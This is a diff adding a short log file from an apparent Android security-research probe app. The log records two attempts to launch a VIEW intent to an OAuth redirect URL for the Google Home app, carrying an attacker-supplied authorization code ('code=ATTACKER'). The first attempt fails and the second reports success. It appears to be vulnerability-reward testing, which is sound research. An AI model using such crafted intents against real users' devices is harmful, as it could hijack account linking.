@@ -1,0 +1,23 @@
+
+====================================================================================================
+CMD: {"type": "start", "action": "android.intent.action.VIEW", "data": "https://oauth-redirect.googleusercontent.com/a/com.google.android.apps.chromecast.app?code=ATTACKER", "label": "gh-acct-linking"}
+----------------------------------------------------------------------------------------------------
+--------- beginning of main
+10-02 14:04:21.104 20818 20818 I VRPPROBE: == EXEC RECEIVED action=com.vrp.probe.EXEC from ?
+10-02 14:04:21.106 20818 20818 I VRPPROBE: CMD_SOURCE=file /storage/emulated/0/Android/data/com.vrp.probe/files/cmd.json bytes=196
+10-02 14:04:21.106 20818 20818 I VRPPROBE: CMD type=start label=gh-acct-linking
+10-02 14:04:21.106 20818 20818 W VRPPROBE: UNKNOWN_TYPE start
+10-02 14:04:21.106 20818 20818 I VRPPROBE: == EXEC DONE
+
+
+====================================================================================================
+CMD: {"type": "start", "action": "android.intent.action.VIEW", "data": "https://oauth-redirect.googleusercontent.com/a/com.google.android.apps.chromecast.app?code=ATTACKER", "label": "gh-acct-linking"}
+----------------------------------------------------------------------------------------------------
+--------- beginning of main
+10-02 14:07:03.418 21235 21235 I VRPPROBE: == EXEC RECEIVED action=com.vrp.probe.EXEC from ?
+10-02 14:07:03.420 21235 21235 I VRPPROBE: CMD_SOURCE=file /storage/emulated/0/Android/data/com.vrp.probe/files/cmd.json bytes=196
+10-02 14:07:03.420 21235 21235 I VRPPROBE: CMD type=start label=gh-acct-linking
+10-02 14:07:03.420 21235 21235 I VRPPROBE: START https://oauth-redirect.googleusercontent.com/a/com.google.android.apps.chromecast.app?code=ATTACKER
+10-02 14:07:03.432 21235 21235 I VRPPROBE:   START_OK
+10-02 14:07:03.432 21235 21235 I VRPPROBE: == EXEC DONE
+
